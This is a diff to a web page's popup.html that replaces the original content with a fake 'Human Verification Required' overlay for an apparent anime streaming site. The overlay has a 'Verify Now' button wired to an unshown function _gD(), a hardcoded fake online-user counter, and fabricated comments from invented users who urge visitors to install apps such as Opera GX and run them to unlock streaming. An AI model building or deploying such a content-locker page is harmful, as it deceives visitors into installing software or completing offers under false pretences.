@@ -1,3 +1,114 @@
 <!--
 // Original popup.html content is commented out
 -->
+
+<!-- Popup Overlay -->
+<div class="popup-overlay" id="human-verification-popup" style="display: none;">
+
+    <div class="popup-content">
+      <img src="https://animesobt.great-site.net/logo.png" alt="Logo" class="popup-logo">
+      <h2>Human Verification Required</h2>
+      <p>Honored user, kindly complete a quick verification to start streaming.</p>
+      <button class="verify-btn" id="verify-btn" onclick="_gD()">Verify Now</button>
+      <p class="instructions">
+        Simply click <strong>"Verify Now"</strong>, to view available task. Please, Complete one task and your access will be unlocked instantly!!
+      </p>
+      <a class="how-to-btn" href="#" id="how-to-btn" target="_blank">.</a>
+      <p>Safe and Secure:</p>
+      <!-- Instructions Container -->
+      <div id="instructions-container" style="display: none;">
+        <!-- Country-specific instructions will be added here dynamically -->
+      </div>
+      
+      <!-- Online User Counter -->
+      <!-- Online User Counter -->
+     <div class="live-counter-container">
+  <div class="counter-icon">
+    <!-- User SVG Icon -->
+    <svg width="20" height="20" fill="#fff" viewBox="0 0 24 24">
+      <path d="M12 12c2.209 0 4-1.791 4-4s-1.791-4-4-4-4 1.791-4 4 1.791 4 4 4zm0 2c-2.67 0-8 1.337-8 4v2h16v-2c0-2.663-5.33-4-8-4z"/>
+    </svg>
+  </div>
+  <div class="counter-details">
+    <div class="counter-text">
+      <span class="counter-number" id="onlineCounter">5993</span>
+      <span class="counter-label">Users Online</span>
+    </div>
+    <div class="live-indicator"></div>
+  </div>
+</div>
+
+
+      
+      <!-- Comment Section -->
+      <div class="comments-container">
+        <div class="comments-header">
+          <b>1725+ Comments</b>
+          <hr />
+        </div>
+        <!-- Comment Input (optional) -->
+        <div class="comment-input-wrapper">
+          <input type="text" id="comment" placeholder="Add a Comment..." />
+          <button id="post">Post</button>
+        </div>
+        <div class="premium-notice">
+          <input id="check" type="checkbox" />
+          <span>Only premium members can comment</span>
+        </div>
+        <!-- Comments List -->
+        <div class="comments-list" id="commentsList">
+          <!-- Group 1: First 10 comments -->
+          <div class="comment" data-comment-id="1" data-offset="5">
+            <div class="comment-avatar">
+              <img src="https://animesobt.great-site.net/Profile2/Wesley.jpg" alt="Profile Picture">
+            </div>
+            <div class="comment-content">
+              <div class="comment-header">
+                <span class="comment-name">Wesley Allen</span>
+                <span class="comment-timestamp">5 seconds ago</span>
+              </div>
+              <p class="comment-text">Worked for me on the first try! Make sure to follow instructions exactly.</p>
+              <div class="comment-actions">
+                <button>Like</button> <span class="like-count">1 Like</span> · 
+                <button>Reply</button>
+              </div>
+            </div>
+          </div>
+          <div class="comment" data-comment-id="2" data-offset="37">
+            <div class="comment-avatar">
+              <img src="https://animesobt.great-site.net/Profile2/Trevor.jpg" alt="Profile Picture">
+            </div>
+            <div class="comment-content">
+              <div class="comment-header">
+                <span class="comment-name">Trevor Anderson</span>
+                <span class="comment-timestamp">37 seconds ago</span>
+              </div>
+              <p class="comment-text">Installed Opera GX on my desktop and got verified in a flash. Smooth and super fast!</p>
+              <div class="comment-actions">
+                <button>Like</button> <span class="like-count">3 Likes</span> · 
+                <button>Reply</button>
+              </div>
+            </div>
+          </div>
+          <div class="comment" data-comment-id="3" data-offset="60">
+            <div class="comment-avatar">
+              <img src="https://animesobt.great-site.net/Profile2/Connor.jpg" alt="Profile Picture">
+            </div>
+            <div class="comment-content">
+              <div class="comment-header">
+                <span class="comment-name">Connor Miller</span>
+                <span class="comment-timestamp">1 minute ago</span>
+              </div>
+              <p class="comment-text">Best trick Guys, if you see 'Run the app (new user only)', just install it and run for 30 seconds.</p>
+              <div class="comment-actions">
+                <button>Like</button> <span class="like-count">5 Likes</span> · 
+                <button>Reply</button>
+              </div>
+            </div>
+          </div>
+          <!-- More comments here... -->
+          <!-- Additional comment sections would be here -->
+        </div><!-- End comments-list -->
+      </div><!-- End comments-container -->
+    </div><!-- End popup-content -->
+  </div><!-- End popup-overlay -->
